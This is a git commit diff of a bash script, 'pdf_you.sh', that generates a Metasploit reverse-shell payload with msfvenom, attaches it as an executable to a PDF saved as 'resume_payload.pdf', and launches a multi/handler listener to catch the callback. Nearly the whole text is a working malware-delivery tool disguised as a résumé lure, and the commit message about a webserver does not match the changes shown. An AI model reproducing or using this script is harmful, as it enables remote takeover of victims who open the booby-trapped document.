d1445b0fdda2da58359bff3a35ad31a30a0f02ba
810810810 <108226535+810810810@users.noreply.github.com>
2023-03-01 16:37:42 +0000

    added webserver functionality

--- pdf_you.sh
+++ pdf_you.sh
@@ -1,7 +1,8 @@
 #!/bin/bash
 
+# Validate user input
 if [[ $# -eq 0 ]] || [[ $# -gt 1 ]]; then
-    echo "Usage: $0 [-h] [-t TYPE] [-a ARCH] [-p PLATFORM] [-l IP_ADDRESS] <PDF_FILE>"
+    echo "Usage: $0 <PDF file>"
     exit 1
 fi
 
@@ -10,107 +11,70 @@ if [ ! -f "$1" ]; then
     exit 1
 fi
 
+# Set the target IP address and port number
 LHOST="$(ip route get 1 | awk '{print $NF;exit}')"
-PAYLOAD_TYPE=""
-PAYLOAD_ARCH=""
-PAYLOAD_PLATFORM=""
+LPORT=$(shuf -i 2000-65000 -n 1)
 
-while [[ $# -gt 0 ]]; do
-  case "$1" in
-    -h|--help)
-      echo "Usage: $0 [-h] [-t TYPE] [-a ARCH] [-p PLATFORM] [-l IP_ADDRESS] <PDF_FILE>"
-      echo "  -h, --help            Show this help message and exit"
-      echo "  -t, --type TYPE       Payload type (e.g. windows/meterpreter/reverse_tcp)"
-      echo "  -a, --arch ARCH       Payload architecture (e.g. x86)"
-      echo "  -p, --platform PLATFORM   Payload platform (e.g. windows)"
-      echo "  -l, --lhost IP_ADDRESS    Local IP address to use (default: auto-detect)"
-      exit 0
-      ;;
-    -t|--type)
-      PAYLOAD_TYPE="$2"
-      shift 2
-      ;;
-    -a|--arch)
-      PAYLOAD_ARCH="$2"
-      shift 2
-      ;;
-    -p|--platform)
-      PAYLOAD_PLATFORM="$2"
-      shift 2
-      ;;
-    -l|--lhost)
-      LHOST="$2"
-      shift 2
-      ;;
-    *)
-      break
-      ;;
-  esac
-done
-
-PDF_FILE="$1"
-
-if [ -z "$PAYLOAD_TYPE" ]; then
-  read -p "Payload type (e.g. windows/meterpreter/reverse_tcp): " PAYLOAD_TYPE
-fi
-
-if [ -z "$PAYLOAD_ARCH" ]; then
-  read -p "Payload architecture (e.g. x86): " PAYLOAD_ARCH
-fi
-
-if [ -z "$PAYLOAD_PLATFORM" ]; then
-  read -p "Payload platform (e.g. windows): " PAYLOAD_PLATFORM
-fi
-
+# Check if pdftk is installed
 if ! command -v pdftk &> /dev/null; then
-  echo "Error: pdftk could not be found. Please install pdftk before running this script." >&2
-  exit 1
+    echo "Error: pdftk could not be found. Please install pdftk before running this script." >&2
+    exit 1
 fi
 
+# Check if msfvenom is installed
 if ! command -v msfvenom &> /dev/null; then
-  echo "Error: msfvenom could not be found. Please install Metasploit Framework before running this script." >&2
-  exit 1
+    echo "Error: msfvenom could not be found. Please install Metasploit Framework before running this script." >&2
+    exit 1
 fi
 
-PAYLOAD=$(msfvenom -p "$PAYLOAD_TYPE" LHOST="$LHOST" LPORT=$(shuf -i 2000-65000 -n 1) -f exe --arch "$PAYLOAD_ARCH" --platform "$PAYLOAD_PLATFORM")
+# Get the payload options from the user
+echo "Enter payload options:"
+read -p "Payload type (e.g. windows/meterpreter/reverse_tcp): " PAYLOAD_TYPE
+read -p "Payload architecture (e.g. x86): " PAYLOAD_ARCH
+read -p "Payload platform (e.g. windows): " PAYLOAD_PLATFORM
 
+# Generate the payload with msfvenom
+PAYLOAD=$(msfvenom -p "$PAYLOAD_TYPE" LHOST="$LHOST" LPORT="$LPORT" -f exe --arch "$PAYLOAD_ARCH" --platform "$PAYLOAD_PLATFORM")
+
+# Create a temporary directory for the files
 WORKDIR=$(mktemp -d)
 
+# Check if the temporary directory was created successfully
 if [ ! -d "$WORKDIR" ]; then
     echo "Error: Could not create temporary directory." >&2
     exit 1
 fi
 
+# Create the executable file with the generated payload
 if ! echo -n "$PAYLOAD" > "$WORKDIR/payload.exe"; then
     echo "Error: Could not create payload file." >&2
     rm -rf "$WORKDIR"
     exit 1
 fi
-if ! pdftk "$PDF_FILE" attach_files "$WORKDIR/payload.exe" to_page 1 output "$WORKDIR/resume_payload.pdf"; then
-echo "Error: Could not inject payload into PDF file." >&2
-rm -rf "$WORKDIR"
-exit 1
+
+# Inject the executable file into the PDF using pdftk
+if ! pdftk "$1" attach_files "$WORKDIR/payload.exe" to_page 1 output "$WORKDIR/resume_payload.pdf"; then
+    echo "Error: Could not inject payload into PDF file." >&2
+    rm -rf "$WORKDIR"
+    exit 1
 fi
 
-PAYLOAD_TYPE_ESCAPED=$(echo "$PAYLOAD_TYPE" | sed 's|/|\/|g')
-
-if ! msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE_ESCAPED; set LHOST $LHOST; set LPORT $LPORT; exploit -j" &> /dev/null; then
-echo "Error: Could not start Metasploit listener." >&2
-rm -rf "$WORKDIR"
-exit 1
+# Start the Metasploit listener in the background
+if ! msfconsole -q -x "use exploit/multi/handler; set PAYLOAD $PAYLOAD_TYPE; set LHOST $LHOST; set LPORT $LPORT; exploit -j" &> /dev/null; then
+    echo "Error: Could not start Metasploit listener." >&2
+    rm -rf "$WORKDIR"
+    exit 1
 fi
 
+# Open the PDF file with the injected payload
 if ! xdg-open "$WORKDIR/resume_payload.pdf"; then
-echo "Error: Could not open PDF file." >&2
-rm -rf "$WORKDIR"
-exit 1
+    echo "Error: Could not open PDF file." >&2
+    rm -rf "$WORKDIR"
+    exit 1
 fi
 
+# Clean up the temporary directory
 if ! rm -rf "$WORKDIR"; then
-echo "Error: Could not clean up temporary files." >&2
-exit 1
+    echo "Error: Could not clean up temporary files." >&2
+    exit 1
 fi
-
-echo "PDF file with injected payload has been created and opened in your default PDF viewer."
-echo "A Metasploit listener has been started in the background. Use 'jobs' to check the status of the job."
-echo "To stop the listener, use 'kill %1' where 1 is the job number."
